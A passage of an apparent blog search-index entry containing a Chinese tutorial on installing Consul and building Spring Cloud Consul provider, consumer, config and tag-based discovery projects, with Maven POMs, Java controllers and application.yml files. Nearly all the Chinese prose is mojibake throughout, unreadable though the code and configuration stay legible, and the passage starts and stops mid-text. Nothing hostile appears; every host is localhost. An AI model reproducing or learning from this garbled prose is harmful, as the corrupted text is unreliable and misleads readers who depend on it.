åŸºç¡€ç¯‡",url:"/posts/29fe9682.html",text:'Consul ä»‹ç»Consul æ˜¯ä»€ä¹ˆä½œä¸ºé›†ç¾¤ç³»ç»Ÿçš„çµé­‚ï¼ŒæœåŠ¡æ²»ç†æ¡†æ¶ä¸€ç›´éƒ½å—æ¶æ„å¸ˆçš„é’çã€‚éšç€å¾®æœåŠ¡æ€æƒ³çš„æ™®åŠï¼Œè¶Šæ¥è¶Šå¤šçš„æœåŠ¡æ²»ç†æ¡†æ¶å¦‚é›¨åæ˜¥ç¬‹èˆ¬å†’äº†å‡ºæ¥ã€‚é™¤äº† Eurekaï¼ŒHashiCorp å…¬å¸çš„ Consul ä¹Ÿè®©è¯¸å¤šæ¶æ„å¸ˆé’çæœ‰åŠ ã€‚Consul æ˜¯ä¸€ä¸ªåˆ†å¸ƒå¼é«˜å¯ç”¨çš„æœåŠ¡ç½‘æ ¼ï¼ˆservice meshï¼‰è§£å†³æ–¹æ¡ˆï¼Œæä¾›åŒ…æ‹¬æœåŠ¡å‘ç°ã€é…ç½®å’Œåˆ†æ®µåŠŸèƒ½åœ¨å†…çš„å…¨åŠŸèƒ½æ§åˆ¶å¹³é¢ã€‚è¿™äº›åŠŸèƒ½ä¸­çš„æ¯ä¸€ä¸ªéƒ½å¯ä»¥æ ¹æ®éœ€è¦å•ç‹¬ä½¿ç”¨ï¼Œä¹Ÿå¯ä»¥ä¸€èµ·ä½¿ç”¨ä»¥æ„å»ºå®Œæ•´çš„æœåŠ¡ç½‘æ ¼ã€‚ç®€å•æ¥è¯´ï¼ŒConsul æ˜¯ä¸€ä¸ªåˆ†å¸ƒå¼é«˜å¯ç”¨çš„ç³»ç»ŸæœåŠ¡å‘ç°ä¸é…ç½®å·¥å…·ï¼Œå®ƒè·Ÿ Eureka çš„æ ¸å¿ƒåŠŸèƒ½ä¸€æ ·ï¼Œä½†ç•¥æœ‰ä¸åŒï¼š Consul ä½¿ç”¨ Go è¯­è¨€ç¼–å†™ï¼Œä»¥ HTTP æ–¹å¼å¯¹å¤–æä¾›æœåŠ¡ Consul æ”¯æŒå¤šæ•°æ®ä¸­å¿ƒï¼Œè¿™æ˜¯å®ƒçš„ä¸€å¤§ç‰¹è‰² Consul æä¾›äº†å¯è§†åŒ–çš„ Web ç•Œé¢ Consul çš„ä¸€è‡´æ€§åè®®æ˜¯ CPï¼ˆRaftï¼‰ Consul é™¤äº†æœåŠ¡å‘ç°ä¹‹å¤–ï¼Œè¿˜æœ‰ä¸€äº›åˆ«çš„åŠŸèƒ½ï¼Œä¾‹å¦‚é…ç½®åŠŸèƒ½ Consul çš„ä¸»è¦åŠŸèƒ½Consul æä¾›äº†ä»¥æœåŠ¡æ²»ç†ä¸ºæ ¸å¿ƒçš„å¤šç§åŠŸèƒ½ä»¥æ»¡è¶³åˆ†å¸ƒå¼ç³»ç»Ÿçš„éœ€è¦ï¼Œå®ƒå¯ä»¥ä½œä¸ºæœåŠ¡æ²»ç†ç»„ä»¶å’Œé…ç½®ä¸­å¿ƒã€‚å½“ç„¶ï¼Œå¸‚åœºä¸Šè¿˜æœ‰å¾ˆå¤šå…¶ä»–ç±»ä¼¼åŠŸèƒ½çš„ä¼˜ç§€æ¡†æ¶ï¼ŒConsul å®˜æ–¹æä¾›äº†å¯¹æ¯”ä¿¡æ¯ï¼Œä»¥ä¾¿æ¶æ„å¸ˆä»¬åœ¨åšæŠ€æœ¯é€‰å‹æ—¶å¯ä»¥å°½å¿«æ‰¾åˆ°æ›´é€‚åˆè‡ªå·±çš„æ–¹æ¡ˆã€‚Consul çš„ä¸»è¦åŠŸèƒ½å¦‚ä¸‹ï¼Œæ›´å¤šä»‹ç»å¯å‚è€ƒï¼šConsul å®˜ç½‘ã€Consul é¡¹ç›®ã€Consul ä¸­æ–‡æ•™ç¨‹ã€‚ æœåŠ¡å‘ç°ï¼šæœ‰äº† Consulï¼ŒæœåŠ¡å¯ä»¥é€šè¿‡ DNS æˆ–è€… HTTP ç›´æ¥æ‰¾åˆ°å®ƒæ‰€ä¾èµ–çš„æœåŠ¡ å¥åº·æ£€æŸ¥ï¼šConsul æä¾›äº†å¥åº·æ£€æŸ¥çš„æœºåˆ¶ï¼Œä»ç®€å•çš„æœåŠ¡ç«¯æ˜¯å¦è¿”å› 200 çš„å“åº”ä»£ç åˆ°è¾ƒä¸ºå¤æ‚çš„å†…å­˜ä½¿ç”¨ç‡æ˜¯å¦ä½äº 90% K/V å­˜å‚¨ï¼šåº”ç”¨ç¨‹åºå¯ä»¥æ ¹æ®éœ€è¦ä½¿ç”¨ Consul çš„ Key/Value å­˜å‚¨ï¼ŒConsul æä¾›äº†ç®€å•æ˜“ç”¨çš„ HTTP æ¥å£æ¥æ»¡è¶³ç”¨æˆ·çš„åŠ¨æ€é…ç½®ã€ç‰¹å¾æ ‡è®°ã€åè°ƒã€Leader é€‰ä¸¾ç­‰éœ€æ±‚ å¤šæ•°æ®ä¸­å¿ƒï¼šConsul åŸç”Ÿæ”¯æŒå¤šæ•°æ®ä¸­å¿ƒï¼Œè¿™æ„å‘³ç€ç”¨æˆ·ä¸ç”¨ä¸ºäº†å¤šæ•°æ®ä¸­å¿ƒè‡ªå·±åšæŠ½è±¡ Consul å®‰è£…Consul çš„å®‰è£…æ¯”è¾ƒç®€å•ï¼Œå®˜æ–¹æä¾›äº†äºŒè¿›åˆ¶å¯æ‰§è¡Œæ–‡ä»¶ï¼Œå¯ä»¥åœ¨å®˜ç½‘ä¸‹è½½è‡ªå·±æ„Ÿå…´è¶£çš„ç‰ˆæœ¬ï¼Œå®‰è£…æ­¥éª¤å¦‚ä¸‹ï¼š å°†å·²ä¸‹è½½çš„ consul_l.2.0_linux_amd64.zip è§£å‹åˆ° /opt/consul/ ç›®å½•ä¸‹ æ·»åŠ  consul åˆ° PATHï¼ˆç¯å¢ƒå˜é‡ï¼‰ æ‰§è¡Œ consul -vï¼Œå¦‚æœä¸æŠ¥é”™ï¼ŒåŸºæœ¬å°±ç®—å®‰è£…æˆåŠŸäº† Consul å¯åŠ¨Consul é›†ç¾¤é»˜è®¤éœ€è¦è‡³å°‘ä¸‰å° Consul å¯åŠ¨ï¼Œå½“æœ‰å¤šä¸ª Consul èŠ‚ç‚¹å¯åŠ¨äº†ï¼Œé‚£ä¹ˆå®ƒä»¬ä¼šè‡ªåŠ¨ç»„æˆé›†ç¾¤ã€‚å¦‚æœåªæ˜¯æƒ³æœ¬åœ°å¼€å‘è°ƒè¯•ï¼Œå¯ä»¥ä½¿ç”¨å¼€å‘è€…æ¨¡å¼å¯åŠ¨ï¼Œæ•°æ®é»˜è®¤ä¿å­˜åœ¨å†…å­˜ä¸­ã€‚ 12# ä½¿ç”¨å¼€å‘æ¨¡å¼ï¼Œå¯åŠ¨consul$ consul agent -dev Consul é»˜è®¤æ˜¯æ²¡æœ‰ UI ç•Œé¢çš„ï¼Œå¦‚æœéœ€è¦å±•ç¤º UI ç•Œé¢ï¼Œå¯ä»¥åŠ ä¸Š -ui å‚æ•°è¿›è¡Œå¯åŠ¨ï¼Œç„¶åé€šè¿‡ http://127.0.0.1:8500 è®¿é—® UI ç•Œé¢ï¼š 1$ consul agent -dev -ui Consul å®ç”¨æ¥å£Consul å¯¹å¤–æä¾›äº†ä¸°å¯Œçš„ APIï¼Œæœ‰è¿ç»´äººå‘˜å–œæ¬¢çš„å‘½ä»¤è¡Œæ¥å£ï¼Œä¹Ÿæœ‰å¼€å‘äººå‘˜å–œæ¬¢çš„ HTTP æ¥å£ï¼Œå¸¸ç”¨çš„æ¥å£å¦‚ä¸‹ï¼š Consul ç®¡ç†å‘½ä»¤ consul membersï¼šæŸ¥çœ‹å½“å‰ Consul é›†ç¾¤é‡Œæ‰€æœ‰æˆå‘˜çš„ä¿¡æ¯ä»¥åŠå®ƒä»¬çš„çŠ¶æ€ï¼šå­˜æ´»ã€ç¦»çº¿ã€å¯åŠ¨å¤±è´¥ consul monitorï¼šæŒç»­æ‰“å°å½“å‰ Consul çš„æ—¥å¿—ä¿¡æ¯ï¼Œè¿™ä¸ªå‘½ä»¤å¾ˆæœ‰ç”¨ï¼Œå› ä¸º Consul è®¿é—®é‡æ¯”è¾ƒå¤§ï¼Œæ‰€ä»¥ç”Ÿäº§ç¯å¢ƒä¸€èˆ¬ä¸ä¼šä¿å­˜æ—¥å¿—ï¼Œå¦‚æœæƒ³æŸ¥çœ‹å®æ—¶æ—¥å¿—ï¼Œå¯ä»¥ä½¿ç”¨è¯¥å‘½ä»¤ consul leaveï¼šé€€å‡ºé›†ç¾¤ï¼Œä¸€èˆ¬ä¼šä½¿ç”¨è¿™ä¸ªå‘½ä»¤è€Œä¸æ˜¯ç›´æ¥æ€æ‰ Consul çš„è¿›ç¨‹ Consul å¯¹å¤–æœåŠ¡æ¥å£ /v1/agent/membersï¼šåˆ—å‡ºé›†ç¾¤å†…çš„æ‰€æœ‰æˆå‘˜åŠå…¶ä¿¡æ¯ /v1/status/leaderï¼šæ˜¾ç¤ºå½“å‰é›†ç¾¤ leader /v1/catalog/servicesï¼šæ˜¾ç¤ºå½“å‰æ³¨å†Œçš„æœåŠ¡ /v1/kv/keyï¼šæ˜¾ç¤ºå½“å‰ Key å¯¹åº”çš„ Value Spring Cloud Consul åŸºç¡€Spring Cloud Consul ä»‹ç»Spring Cloud Consul é€šè¿‡è‡ªåŠ¨é…ç½®ã€å¯¹ Spring Environment ç»‘å®šå’Œå…¶ä»–æƒ¯ç”¨çš„ Spring æ¨¡å—ï¼Œä¸º Spring Boot åº”ç”¨ç¨‹åºæä¾›äº† Consul é›†æˆã€‚åªéœ€è¦ä¸€äº›ç®€å•æ³¨è§£ï¼Œå°±å¯ä»¥å¿«é€Ÿå¯ç”¨å’Œé…ç½® Consulï¼Œå¹¶ç”¨å®ƒæ¥æ„å»ºå¤§å‹åˆ†å¸ƒå¼ç³»ç»Ÿã€‚Spring Cloud Consul ä½œä¸º Spring Cloud ä¸ Consul ä¹‹é—´çš„æ¡¥æ¢ï¼Œå¯¹äºŒè€…éƒ½æœ‰è‰¯å¥½çš„æ”¯æŒï¼Œå…¶ç‰¹æ€§å¦‚ä¸‹ï¼š æœåŠ¡æ³¨å†Œå‘ç°ï¼Œå®ä¾‹å¯ä»¥å‘ Consul æ³¨å†ŒæœåŠ¡ï¼Œå®¢æˆ·ç«¯å¯ä»¥ä½¿ç”¨ Spring Bean æ¥å‘ç°æœåŠ¡æä¾›æ–¹ æ”¯æŒ Ribbon çš„å®¢æˆ·ç«¯è´Ÿè½½ æ”¯æŒ Zuul æœåŠ¡ç½‘å…³ åˆ†å¸ƒå¼é…ç½®ä¸­å¿ƒï¼Œä½¿ç”¨çš„æ˜¯ Consul çš„ K/V å­˜å‚¨ æ§åˆ¶æ€»çº¿ï¼Œä½¿ç”¨çš„æ˜¯ Consul Events Spring Cloud Consul å…¥é—¨æ¡ˆä¾‹Spring Cloud Consul æä¾›äº† busã€configã€discovery ç­‰æ¨¡å—ï¼Œé¡¹ç›®ä¸­å¯ä»¥æ ¹æ®å…·ä½“çš„éœ€è¦é€‰æ‹©å¯¹åº”çš„æ¨¡å—ã€‚ä¸‹é¢å°†æ¼”ç¤ºå¦‚ä½•ä½¿ç”¨ configã€discovery æ¨¡å—ï¼Œç‚¹å‡»ä¸‹è½½å®Œæ•´çš„æ¡ˆä¾‹ä»£ç ã€‚ 1. ç‰ˆæœ¬è¯´æ˜åœ¨ä¸‹é¢çš„çš„æ•™ç¨‹ä¸­ï¼Œä½¿ç”¨çš„ Spring Cloud ç‰ˆæœ¬æ˜¯ Finchley.RELEASEï¼Œå¯¹åº”çš„ Spring Boot ç‰ˆæœ¬æ˜¯ 2.0.3ã€‚ 2. åˆ›å»º Maven çˆ¶çº§ Pom å·¥ç¨‹åœ¨çˆ¶å·¥ç¨‹é‡Œé¢é…ç½®å¥½å·¥ç¨‹éœ€è¦çš„çˆ¶çº§ä¾èµ–ï¼Œç›®çš„æ˜¯ä¸ºäº†æ›´æ–¹ä¾¿ç®¡ç†ä¸ç®€åŒ–é…ç½®ï¼Œå…·ä½“ Maven é…ç½®å¦‚ä¸‹ï¼š 1234567891011121314151617181920212223242526272829303132333435363738&lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;2.0.3.RELEASE&lt;/version&gt;&lt;/parent&gt;&lt;!-- åˆ©ç”¨ä¼ é€’ä¾èµ–ï¼Œå…¬å…±éƒ¨åˆ† --&gt;&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt;&lt;/dependencies&gt;&lt;!-- ç®¡ç†ä¾èµ– --&gt;&lt;dependencyManagement&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-dependencies&lt;/artifactId&gt; &lt;version&gt;Finchley.RELEASE&lt;/version&gt; &lt;type&gt;pom&lt;/type&gt; &lt;scope&gt;import&lt;/scope&gt; &lt;/dependency&gt; &lt;/dependencies&gt;&lt;/dependencyManagement&gt;&lt;!--æ³¨æ„ï¼šè¿™é‡Œéœ€è¦æ·»åŠ ä»¥ä¸‹é…ç½®ï¼Œå¦åˆ™å¯èƒ½ä¼šæœ‰å„ç§ä¾èµ–é—®é¢˜ --&gt;&lt;repositories&gt; &lt;repository&gt; &lt;id&gt;spring-milestones&lt;/id&gt; &lt;name&gt;Spring Milestones&lt;/name&gt; &lt;url&gt;https://repo.spring.io/libs-milestone&lt;/url&gt; &lt;snapshots&gt; &lt;enabled&gt;false&lt;/enabled&gt; &lt;/snapshots&gt; &lt;/repository&gt;&lt;/repositories&gt; 3. åˆ›å»º Consul Provider å·¥ç¨‹åˆ›å»º Consul Provider çš„ Maven å·¥ç¨‹ï¼Œé…ç½®å·¥ç¨‹é‡Œçš„ pom.xml æ–‡ä»¶ï¼Œå¼•å…¥ spring-cloud-starter-consul-discoveryï¼Œå°†æœåŠ¡å®ä¾‹æ³¨å†Œåˆ° Consulï¼š 1234&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-consul-discovery&lt;/artifactId&gt;&lt;/dependency&gt; åˆ›å»º Consul Provider çš„ä¸»å¯åŠ¨ç±»ï¼Œè¿™é‡Œå¯ä»¥ç¼ºçœæ·»åŠ  @EnableDiscoveryClient æ³¨è§£ï¼š 12345678@EnableDiscoveryClient@SpringBootApplicationpublic class ProviderApplication { public static void main(String[] args) { SpringApplication.run(ProviderApplication.class, args); }} åˆ›å»º Consul Provider çš„æµ‹è¯•æ§åˆ¶ç±»ï¼Œå€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œåœ¨ä¸å¼•å…¥ spring-boot-starter-actuator ä¾èµ–çš„æƒ…å†µä¸‹ï¼Œå¿…é¡»æ‰‹åŠ¨åˆ›å»º /actuator/health æ¥å£ï¼Œè¿™æ˜¯æ–°ç‰ˆ Spring Cloud Consul çš„é»˜è®¤æ³¨å†Œå¥åº·æ£€æŸ¥æ¥å£ï¼Œå¦åˆ™ Consul ä¼šè®¤ä¸ºæœåŠ¡ä¸å¯ç”¨ï¼š 12345678910111213141516@RestControllerpublic class ProviderController { @Value("${server.port}") private String port; @GetMapping("/actuator/health") public String health() { return "SUCCESS"; } @GetMapping("/provider/sayHello") public String sayHello(String name) { return "from port " + port + ": hello " + name; }} æ·»åŠ  Consul Provider éœ€è¦çš„ application.yml é…ç½®æ–‡ä»¶åˆ°å·¥ç¨‹ä¸­ï¼š 12345678910server: port: 9001spring: application: name: consul-provider cloud: consul: host: 127.0.0.1 # consul åœ°å€ port: 8500 # consul ç«¯å£ 4. åˆ›å»º Consul Consumer å·¥ç¨‹åˆ›å»º Consul Consumer çš„ Maven å·¥ç¨‹ï¼Œé…ç½®å·¥ç¨‹é‡Œçš„ pom.xml æ–‡ä»¶ï¼Œå¼•å…¥ spring-cloud-starter-consul-discoveryï¼Œå°†æœåŠ¡å®ä¾‹æ³¨å†Œåˆ° Consulï¼ŒåŒæ—¶å¼•å…¥ Feignï¼š 12345678&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-consul-discovery&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-openfeign&lt;/artifactId&gt;&lt;/dependency&gt; åˆ›å»º Consul Consumer çš„ä¸»å¯åŠ¨ç±»ï¼Œè¿™é‡Œå¯ä»¥ç¼ºçœæ·»åŠ  @EnableDiscoveryClient æ³¨è§£ï¼š 123456789@EnableFeignClients@EnableDiscoveryClient@SpringBootApplicationpublic class ConsumerApplication { public static void main(String[] args) { SpringApplication.run(ConsumerApplication.class, args); }} åˆ›å»º Consul Consumer çš„æœåŠ¡æ¥å£ç±»ï¼Œç”¨äºè°ƒç”¨ Provider æœåŠ¡ï¼š 123456@FeignClient(value = "consul-provider")public interface HelloService { @RequestMapping(value = "/provider/sayHello", method = RequestMethod.GET) public String sayHello(@RequestParam("name") String name);} åˆ›å»º Consul Consumer çš„æµ‹è¯•æ§åˆ¶ç±»ï¼Œåœ¨ä¸å¼•å…¥ spring-boot-starter-actuator ä¾èµ–çš„æƒ…å†µä¸‹ï¼Œå¿…é¡»æ‰‹åŠ¨åˆ›å»º /actuator/health æ¥å£ï¼Œè¿™æ˜¯æ–°ç‰ˆ Spring Cloud Consul çš„é»˜è®¤æ³¨å†Œå¥åº·æ£€æŸ¥æ¥å£ï¼Œå¦åˆ™ Consul ä¼šè®¤ä¸ºæœåŠ¡ä¸å¯ç”¨ï¼š 12345678910111213141516@RestControllerpublic class ConsumerController { @Autowired private HelloService helloService; @GetMapping("/actuator/health") public String health() { return "SUCCESS"; } @GetMapping("/consumer/sayHello") public String sayHello(String name) { return helloService.sayHello(name); }} æ·»åŠ  Consul Consumer éœ€è¦çš„ application.yml é…ç½®æ–‡ä»¶åˆ°å·¥ç¨‹ä¸­ï¼š 12345678910server: port: 9002spring: application: name: consul-consumer cloud: consul: host: 127.0.0.1 # consul åœ°å€ port: 8500 # consul ç«¯å£ 5. åˆ›å»º Consul Config å·¥ç¨‹åˆ›å»º Consul Config çš„ Maven å·¥ç¨‹ï¼Œé…ç½®å·¥ç¨‹é‡Œçš„ pom.xml æ–‡ä»¶ï¼Œå¼•å…¥ spring-cloud-starter-consul-configï¼›è¿™é‡Œçš„ Consul Config å·¥ç¨‹ä¸ä¸Šé¢çš„ Providerã€Consumer å·¥ç¨‹æ²¡æœ‰ä»»ä½•å…³ç³»ï¼Œä½œç”¨æ˜¯ç”¨æ¥å•ç‹¬æ¼”ç¤º Consul çš„ Config åŠŸèƒ½ï¼ˆé…ç½®ä¸­å¿ƒï¼‰ï¼š 1234&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-consul-config&lt;/artifactId&gt;&lt;/dependency&gt; åˆ›å»º Consul Config çš„æµ‹è¯•æ§åˆ¶ç±»ï¼š 12345678910111213@RefreshScope@RestController@RequestMapping("/config")public class ConfigController { @Value("${foo.bar.name}") private String name; @GetMapping("/getName") public String getName() { return name; }} æ·»åŠ  Consul Config éœ€è¦çš„ application.yml é…ç½®æ–‡ä»¶åˆ°å·¥ç¨‹ä¸­ï¼š 12345678910server: port: 9003spring: application: name: consul-config cloud: consul: host: 127.0.0.1 # consul åœ°å€ port: 8500 # consul ç«¯å£ 6. æµ‹è¯•ç»“æœ å¯åŠ¨æœ¬åœ°çš„ consul æœåŠ¡å™¨ ä¾æ¬¡å¯åŠ¨ consul-providerã€consul-consumer åº”ç”¨ è®¿é—® consul çš„ç®¡ç†ç•Œé¢ï¼šhttp://127.0.0.1:8500ï¼Œå¦‚æœå„ä¸ªæœåŠ¡çš„ Health Checks æ˜¾ç¤ºç»¿è‰²çš„å¯¹å‹¾ï¼Œå³è¡¨ç¤ºæœåŠ¡æ³¨å†ŒæˆåŠŸï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š è®¿é—® http://127.0.0.1:9002/consumer/sayHello?name=Peterï¼Œå¦‚æœè¿”å› from port 9001: hello Peterï¼Œè¯´æ˜ consul-providerã€consul-consumer åº”ç”¨ä¸€åˆ‡è¿è¡ŒæˆåŠŸ è®¿é—® http://127.0.0.1:8500/ui/dc1/kvï¼Œç‚¹å‡»é¡µé¢ä¸Šçš„ create æŒ‰é’®ï¼Œåœ¨ Key or folder æ è¾“å…¥ config/consul-config/foo.bar.nameï¼Œvalue æ è¾“å…¥ bookï¼Œç„¶åç‚¹å‡» save æŒ‰é’®ä¿å­˜ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š å¯åŠ¨ consul-config åº”ç”¨ï¼Œè®¿é—® http://127.0.0.1:9003/config/getNameï¼Œå¦‚æœæ¥å£è¿”å› bookï¼Œè¯´æ˜æˆåŠŸè®¿é—®åˆ° Consul Config çš„ Key/Value å­˜å‚¨ Spring Cloud Consul æ·±å…¥Spring Cloud Consul æ¨¡å—ä»‹ç»Spring Cloud Consul æ˜¯åœ¨ ecwid çš„ consul-api çš„åŸºç¡€ä¸Šåˆå°è£…äº†ä¸€å±‚åŠŸèƒ½ï¼Œä½¿å…¶è·Ÿç°æœ‰ Spring Cloud ç»„ä»¶èåˆï¼Œè¾¾åˆ°å¼€ç®±å³ç”¨çš„ç›®çš„ã€‚å›´ç»•ç€ Consul çš„æ ¸å¿ƒåŠŸèƒ½ï¼ŒSpring Cloud Consul ä¹Ÿæä¾›äº†ç›¸åº”çš„åŠŸèƒ½æ¨¡å—ä¸ä¹‹åŒ¹é…ï¼Œå…¶ä¸­ Consul çš„äº‹ä»¶åŠŸèƒ½æ¯”è¾ƒå¼±åŒ–ï¼Œåº”ç”¨æ¯”è¾ƒå¤šçš„æ˜¯æœåŠ¡æ²»ç†å’Œé…ç½®åŠŸèƒ½ï¼Œå„ä¸ªæ¨¡å—çš„ä»‹ç»å¦‚ä¸‹ï¼š spring-cloud-consul-binderï¼šå¯¹ Consul çš„äº‹ä»¶åŠŸèƒ½å°è£… spring-cloud-consul-configï¼šå¯¹ Consul çš„é…ç½®åŠŸèƒ½å°è£… spring-cloud-consul-coreï¼šåŸºç¡€é…ç½®å’Œå¥åº·æ£€æŸ¥æ¨¡å— spring-cloud-consul-discoveryï¼šå¯¹ Consul æœåŠ¡æ²»ç†åŠŸèƒ½å°è£… Spring Cloud Consul DiscoveryåŸºç¡€é…ç½®æœåŠ¡å¯åŠ¨æ—¶ï¼Œä¼šé€šè¿‡ ConsulServiceRegistry.registerï¼ˆï¼‰ å‘ Consul æ³¨å†Œè‡ªèº«çš„æœåŠ¡ã€‚æœåŠ¡æ³¨å†Œæ—¶ï¼Œä¼šå‘Šè¯‰ Consul ä»¥ä¸‹ä¿¡æ¯ï¼š IDï¼šæœåŠ¡ IDï¼Œé»˜è®¤æ˜¯æœåŠ¡å + ç«¯å£å· Nameï¼šæœåŠ¡åï¼Œé»˜è®¤æ˜¯åº”ç”¨åç§° Tagsï¼šç»™æœåŠ¡æ‰“çš„æ ‡ç­¾ï¼Œé»˜è®¤æ˜¯ [secure=false] Addressï¼šæœåŠ¡åœ°å€ï¼Œé»˜è®¤æ˜¯æœ¬æœº IP Portï¼šæœåŠ¡ç«¯å£ï¼Œé»˜è®¤æ˜¯æœåŠ¡çš„ Web ç«¯å£ Checkï¼šå¥åº·æ£€æŸ¥ä¿¡æ¯ï¼ŒåŒ…æ‹¬ Intervalï¼ˆå¥åº·æ£€æŸ¥é—´éš”ï¼‰å’Œ HTTPï¼ˆå¥åº·æ£€æŸ¥åœ°å€ï¼‰ ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œä¸éœ€è¦æ˜¾å¼æä¾›ä¸Šè¿°ä¿¡æ¯ï¼ŒSpring Cloud Consul ä¼šæœ‰é»˜è®¤å€¼ï¼Œä½†æ˜¯åœ¨ä¸€äº›ç‰¹æ®Šä¸šåŠ¡åœºæ™¯ä¸­ï¼Œå¯èƒ½å°±éœ€è¦å®šåˆ¶ä¸Šè¿°æœåŠ¡äº†ã€‚Consul Discovery çš„å¸¸è§é…ç½®å¦‚ä¸‹ï¼š Tags æ ä¼šæœ‰ä¸€ä¸ª secure=falseï¼Œè¿™ä¸ªæ˜¯ Spring Cloud Consul é»˜è®¤åŠ ä¸Šçš„ï¼Œå®ƒå–è‡ªé…ç½® spring.cloud.consul.discovery.schemeï¼Œé»˜è®¤å€¼æ˜¯ httpã€‚å¦‚æœæœåŠ¡æä¾›çš„æ˜¯ https çš„æœåŠ¡æ—¶ï¼Œéœ€è¦é…ç½®è¯¥å€¼ä¸º httpsï¼Œå®ƒçš„ä½œç”¨æ˜¯å‘Šè¯‰æœåŠ¡æ¶ˆè´¹è€…è°ƒç”¨æœåŠ¡æ–¹æ¥å£æ—¶éœ€è¦å“ªç§åè®®ã€‚é…ç½®ç¤ºä¾‹å¦‚ä¸‹ï¼š 1234567891011/** * è‡ªå®šä¹‰å¥åº·æ£€æµ‹æ¥å£ */@RestControllerpublic class ProviderController { @GetMapping("/health") public String health() { return "SUCCESS"; }} 1234567891011121314151617server: port: 9001spring: application: name: consul-provider cloud: consul: host: 127.0.0.1 # consul å¯åŠ¨åœ°å€ port: 8500 # consul å¯åŠ¨ç«¯å£ discovery: prefer-ip-address: true # ä¼˜å…ˆä½¿ç”¨ IP æ³¨å†Œ ip-address: 127.0.0.1 # è‹¥éƒ¨ç½²åœ¨ Docker ä¸­,æŒ‡å®šå®¿ä¸»æœº IP port: 9001 # è‹¥éƒ¨ç½²åœ¨ Docker ä¸­,æŒ‡å®šå®¿ä¸»æœºç«¯å£ health-check-interval: 20s # å¥åº·æ£€æŸ¥é—´éš”æ—¶é—´ä¸º 20s health-check-path: /health # è‡ªå®šä¹‰å¥åº·æ£€æŸ¥è·¯å¾„ tags: ${LANG},test # æŒ‡å®šæœåŠ¡çš„æ ‡ç­¾, ç”¨é€—å·éš”å¼€ æœåŠ¡å‘ç°æ¡ˆä¾‹Spring Cloud Consul æä¾›äº†ä¸¤ç§æ–¹å¼çš„æœåŠ¡å‘ç°åŠŸèƒ½ï¼šRibbon å’Œ DiscoveryClientã€‚å¦‚æœå®¢æˆ·ç«¯ä½¿ç”¨äº† Feign æˆ–è€… @LoadBalancerd æ³¨è§£ï¼Œé‚£ä¹ˆé»˜è®¤ä½¿ç”¨çš„æ˜¯ ConsulServerList æä¾›çš„æœåŠ¡å‘ç°é€»è¾‘ã€‚å¦‚æœå®¢æˆ·ç«¯åªæƒ³ç‹¬ç«‹ä½¿ç”¨æœåŠ¡å‘ç°åŠŸèƒ½ï¼Œé‚£ä¹ˆå¯ä»¥ç›´æ¥ä½¿ç”¨ DiscoveryClientã€‚ä¸Šé¢æåˆ°äº†ä½¿ç”¨ Consul çš„ Tags åŠŸèƒ½å°†æœåŠ¡åˆ†ç»„ï¼Œä¸‹é¢å°±ç”¨ä¸Šé¢è¯´çš„ä¸¤ç§æ–¹å¼åˆ†åˆ«è°ƒç”¨æœåŠ¡æä¾›è€…çš„æ¥å£ï¼Œç‚¹å‡»ä¸‹è½½å®Œæ•´çš„æ¡ˆä¾‹ä»£ç ï¼Œç”±äºç¯‡å¹…æœ‰é™ï¼Œä»¥ä¸‹åªç»™å‡ºæ ¸å¿ƒä»£ç å’Œé…ç½®ã€‚ 1. åˆ›å»º Consul Provider Tag One å·¥ç¨‹åˆ›å»º Consul Provider Tag One çš„ä¸»å¯åŠ¨ç±»ï¼š 12345678@EnableDiscoveryClient@SpringBootApplicationpublic class ProviderOneApplication { public static void main(String[] args) { SpringApplication.run(ProviderOneApplication.class, args); }} åˆ›å»º Consul Provider Tag One çš„æµ‹è¯•æ§åˆ¶ç±»ï¼š 123456789101112131415public class ProviderOneController { @Value("${server.port}") private String port; @GetMapping("/actuator/health") public String health() { return "SUCCESS"; } @GetMapping("/provider/sayHello/{name}") public String sayHello(@PathVariable("name") String name) { return "from port " + port + ": hello " + name; }} åˆ›å»º Consul Provider Tag One çš„ application.yml é…ç½®æ–‡ä»¶ï¼ŒåŠ å…¥ tags å±æ€§ï¼š 123456789101112server: port: 9001spring: application: name: consul-provider cloud: consul: host: 127.0.0.1 # consul å¯åŠ¨åœ°å€ port: 8500 # consul å¯åŠ¨ç«¯å£ discovery: tags: tag1 2. åˆ›å»º Consul Provider Tag Two å·¥ç¨‹åˆ›å»º Consul Provider Tag Two çš„ä¸»å¯åŠ¨ç±»ï¼š 12345678@EnableDiscoveryClient@SpringBootApplicationpublic class ProviderTwoApplication { public static void main(String[] args) { SpringApplication.run(ProviderTwoApplication.class, args); }} åˆ›å»º Consul Provider Tag Two çš„æµ‹è¯•æ§åˆ¶ç±»ï¼š 12345678910111213141516@RestControllerpublic class ProviderTwoController { @Value("${server.port}") private String port; @GetMapping("/actuator/health") public String health() { return "SUCCESS"; } @GetMapping("/provider/sayHello/{name}") public String sayHello(@PathVariable("name") String name) { return "from port " + port + ": hello " + name; }} åˆ›å»º Consul Provider Tag Two çš„ application.yml é…ç½®æ–‡ä»¶ï¼ŒåŠ å…¥ tags å±æ€§ï¼š 123456789101112server: port: 9002spring: application: name: consul-provider cloud: consul: host: 127.0.0.1 # consul å¯åŠ¨åœ°å€ port: 8500 # consul å¯åŠ¨ç«¯å£ discovery: tags: tag2 3. åˆ›å»º Consul Consumer Ribbon å·¥ç¨‹åˆ›å»º 